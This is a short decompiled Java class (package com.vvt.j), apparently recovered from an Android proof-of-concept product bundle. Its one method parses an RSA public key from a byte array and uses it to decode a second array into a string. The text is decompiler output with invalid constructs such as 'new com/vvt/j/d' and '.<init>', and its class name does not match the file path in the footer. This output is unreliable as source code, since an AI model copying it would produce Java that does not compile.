package com.vvt.j;

import com.vvt.l.f;
import com.vvt.l.g;
import java.security.interfaces.RSAPublicKey;

public class b
{
  public String a(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2)
  {
    Object localObject1 = new com/vvt/j/d;
    Object localObject2 = g.a(paramArrayOfByte2);
    ((d)localObject1).<init>((RSAPublicKey)localObject2);
    localObject1 = f.a(((d)localObject1).a(), paramArrayOfByte1);
    localObject2 = new java/lang/String;
    ((String)localObject2).<init>((byte[])localObject1);
    return (String)localObject2;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/j/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */